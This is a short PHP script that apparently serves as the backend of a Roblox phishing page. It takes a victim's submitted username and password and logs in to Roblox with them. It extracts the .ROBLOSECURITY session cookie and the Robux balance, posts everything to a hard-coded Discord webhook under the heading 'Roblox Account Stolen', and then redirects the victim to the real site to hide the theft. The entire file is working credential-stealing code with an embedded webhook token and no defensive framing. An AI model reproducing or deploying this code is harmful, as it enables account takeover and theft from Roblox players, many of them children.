<?php
$webhook = "https://discord.com/api/webhooks/1490067951439839406/GErlfwuB3c8H2w0RK0zFetfIHkoqobIbtNzodrD2aS4TVZclH16G-6oNgvf1RDBGOGSi";
$user = $_POST['username'] ?? '';
$pass = $_POST['password'] ?? '';
if (!$user || !$pass) exit;

// Login to Roblox
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['cvalue' => $user, 'password' => $pass]));
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, true);
$response = curl_exec($ch);
$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
$headers = substr($response, 0, $header_size);
preg_match('/\.ROBLOSECURITY=([^;]+)/', $headers, $match);
$cookie = $match[1] ?? 'Not obtained (wrong password or 2FA)';
curl_close($ch);

// Fetch extra data if cookie obtained
$extra = "";
if ($cookie && $cookie != 'Not obtained') {
    $ctx = stream_context_create(['http' => ['header' => "Cookie: .ROBLOSECURITY=$cookie"]]);
    $userinfo = @file_get_contents('https://www.roblox.com/mobileapi/userinfo', false, $ctx);
    if ($userinfo) {
        $data = json_decode($userinfo, true);
        $robux = $data['RobuxBalance'] ?? 0;
        $premium = $data['IsPremium'] ? 'True' : 'False';
        $extra = "\n💰 Robux: $robux\n⭐ Premium: $premium";
    }
}

// Send to Discord
$content = "**🔐 Roblox Account Stolen**\n👤 $user\n🔑 $pass\n🍪 $cookie$extra";
file_get_contents($webhook, false, stream_context_create([
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => json_encode(['content' => $content])
    ]
]));

// Redirect to real Roblox
header('Location: https://www.roblox.com/home');
?>
